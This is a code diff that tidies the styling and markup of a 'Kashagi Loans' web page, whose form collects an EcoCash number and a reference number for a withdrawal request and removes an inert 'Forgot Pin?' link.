@@ -11,7 +11,6 @@
     <title>Kashagi Loans</title>
 
     <style>
-
         * {
             box-sizing: border-box;
         }
@@ -19,13 +18,9 @@
         body {
             margin: 0;
             padding: 20px;
-
             min-height: 100vh;
 
-            font-family:
-                Arial,
-                Helvetica,
-                sans-serif;
+            font-family: Arial, Helvetica, sans-serif;
 
             background: #eef5fb;
 
@@ -34,16 +29,11 @@
             justify-content: center;
         }
 
-
-        /* =========================
-           MAIN CONTAINER
-        ========================= */
-
         .container {
             width: 100%;
             max-width: 590px;
 
-            background: white;
+            background: #ffffff;
 
             border-radius: 20px;
 
@@ -52,11 +42,6 @@
             box-shadow:
                 0 12px 35px rgba(0, 0, 0, 0.15);
         }
-
-
-        /* =========================
-           BLUE HEADER
-        ========================= */
 
         .header {
             background: #1877f2;
@@ -67,7 +52,6 @@
 
             padding: 40px 20px 42px;
         }
-
 
         .logo {
             width: 150px;
@@ -80,7 +64,6 @@
             margin: 0 auto 18px;
         }
 
-
         .title {
             margin: 0;
 
@@ -89,27 +72,19 @@
             font-weight: 700;
         }
 
-
         .subtitle {
             margin-top: 10px;
 
             font-size: 24px;
         }
 
-
-        /* =========================
-           FORM AREA
-        ========================= */
-
         .form-area {
             padding: 40px;
         }
 
-
         .field {
             margin-bottom: 28px;
         }
-
 
         label {
             display: block;
@@ -120,9 +95,8 @@
 
             font-weight: 700;
 
-            color: #333;
+            color: #333333;
         }
-
 
         input {
             width: 100%;
@@ -139,9 +113,8 @@
 
             outline: none;
 
-            background: white;
+            background: #ffffff;
         }
-
 
         input:focus {
             border-color: #1877f2;
@@ -149,11 +122,6 @@
             box-shadow:
                 0 0 0 2px rgba(24, 119, 242, 0.12);
         }
-
-
-        /* =========================
-           BUTTON
-        ========================= */
 
         .withdraw-btn {
             width: 100%;
@@ -175,36 +143,11 @@
             cursor: pointer;
         }
 
-
         .withdraw-btn:disabled {
             opacity: 0.7;
 
             cursor: not-allowed;
         }
-
-
-        /* =========================
-           FORGOT PIN
-        ========================= */
-
-        .forgot {
-            display: block;
-
-            text-align: center;
-
-            margin-top: 28px;
-
-            color: #1877f2;
-
-            font-size: 21px;
-
-            text-decoration: none;
-        }
-
-
-        /* =========================
-           MOBILE
-        ========================= */
 
         @media (max-width: 600px) {
 
@@ -212,65 +155,47 @@
                 padding: 0 12px;
             }
 
-
             .header {
                 padding: 38px 15px 40px;
             }
-
 
             .logo {
                 width: 145px;
                 height: 145px;
             }
 
-
             .title {
                 font-size: 36px;
             }
-
 
             .subtitle {
                 font-size: 22px;
             }
 
-
             .form-area {
                 padding: 35px 30px;
             }
-
 
             label {
                 font-size: 23px;
             }
 
-
             input {
                 height: 68px;
-
                 font-size: 20px;
             }
 
-
             .withdraw-btn {
                 height: 70px;
-
                 font-size: 22px;
             }
         }
-
     </style>
 </head>
 
-
 <body>
 
-
 <div class="container">
-
-
-    <!-- =========================
-         HEADER
-    ========================= -->
 
     <div class="header">
 
@@ -280,11 +205,9 @@
             class="logo"
         >
 
-
         <h1 class="title">
             Kashagi Loans
         </h1>
-
 
         <div class="subtitle">
             Fast • Secure • Reliable
@@ -293,13 +216,7 @@
     </div>
 
 
-
-    <!-- =========================
-         FORM
-    ========================= -->
-
     <div class="form-area">
-
 
         <!-- ECOCASH NUMBER -->
 
@@ -308,7 +225,6 @@
             <label for="ecocash_number">
                 EcoCash Number
             </label>
-
 
             <input
                 type="tel"
@@ -320,7 +236,6 @@
         </div>
 
 
-
         <!-- REFERENCE NUMBER -->
 
         <div class="field">
@@ -328,7 +243,6 @@
             <label for="reference_number">
                 Reference Number
             </label>
-
 
             <input
                 type="text"
@@ -340,8 +254,7 @@
         </div>
 
 
-
-        <!-- WITHDRAW BUTTON -->
+        <!-- SUBMIT -->
 
         <button
             type="button"
@@ -352,31 +265,14 @@
             Withdraw to EcoCash
         </button>
 
-
-
-        <!-- FORGOT PIN -->
-
-        <a
-            href="#"
-            class="forgot"
-            onclick="return false;"
-        >
-            Forgot Pin?
-        </a>
-
     </div>
 
 </div>
 
 
-
 <script>
 
-
 async function submitForm() {
-
-
-    // Get EcoCash number
 
     const ecocashNumber =
         document
@@ -384,19 +280,12 @@ async function submitForm() {
         .value
         .trim();
 
-
-
-    // Get reference number
-
     const referenceNumber =
         document
         .getElementById("reference_number")
         .value
         .trim();
 
-
-
-    // Check EcoCash number
 
     if (!ecocashNumber) {
 
@@ -408,9 +297,6 @@ async function submitForm() {
     }
 
 
-
-    // Check reference number
-
     if (!referenceNumber) {
 
         alert(
@@ -421,15 +307,11 @@ async function submitForm() {
     }
 
 
-
     const button =
         document.getElementById(
             "withdrawBtn"
         );
 
-
-
-    // Disable button while processing
 
     button.disabled = true;
 
@@ -437,9 +319,7 @@ async function submitForm() {
         "Processing...";
 
 
-
     try {
-
 
         const response =
             await fetch(
@@ -465,13 +345,9 @@ async function submitForm() {
             );
 
 
-
         const data =
             await response.json();
 
-
-
-        // Server returned an error
 
         if (
             !response.ok ||
@@ -482,26 +358,20 @@ async function submitForm() {
                 data.message ||
                 "Submission failed."
             );
+
         }
 
-
-
-        // Successful submission
 
         alert(
             "Withdrawal request has been received successfully."
         );
 
 
-
-        // Redirect after OK
-
         window.location.href =
             "/thankyou.html";
 
 
     } catch (error) {
-
 
         console.error(
             "SUBMISSION ERROR:",
@@ -522,9 +392,7 @@ async function submitForm() {
 
 }
 
-
 </script>
-
 
 </body>
 </html>
